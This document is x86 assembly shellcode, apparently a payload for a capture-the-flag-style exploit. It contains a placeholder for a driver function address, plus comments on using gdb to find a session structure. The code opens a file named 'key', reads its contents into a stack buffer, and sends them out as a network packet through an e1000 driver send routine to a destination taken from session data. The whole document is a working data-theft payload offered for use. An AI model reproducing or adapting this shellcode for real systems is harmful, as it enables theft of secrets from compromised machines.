[bits 32]

; save pointer to session info structure for communications
;  - find this with gdb. use an int3 at the beginning of your shellcode and examine memory
mov ebp, [esp-968]

; edi = open('key', O_RDONLY)
push 0x0079656b
mov edi, esp
push 0
push edi
push 5
pop eax
call do_syscall3

; allocate some stack space for a buffer
mov edi, eax
sub esp, 0x200
mov esi, esp

; eax = read(edi, buf, 200)
push 0x200
push esi
push edi
push 3
pop eax
call do_syscall3

; send the data over the wire
mov ebx, esi
call send_message

; breakpoint instruction - will exit the process if debugger not attached
int3

; call the e1000 function to send a packet
send_message:
push eax		; len(payload)
push ebx		; payload
push dword [ebp+4]	; dstPort
push dword [ebp+0]	; dstip
push 4444		; srcPort
push dword [ebp+8]	; pci_device*
mov ebx, ${sendPkt}
call ebx
add esp, 6*4
ret

; perform a syscall by copying stack arguments into registers
;  - note destroys eax, ebx, ecx and edx
do_syscall3:
 mov	edx, [esp+0xc]
 mov    ecx, [esp+0x8]
 mov    ebx, [esp+4]
 int	0x80
 ret

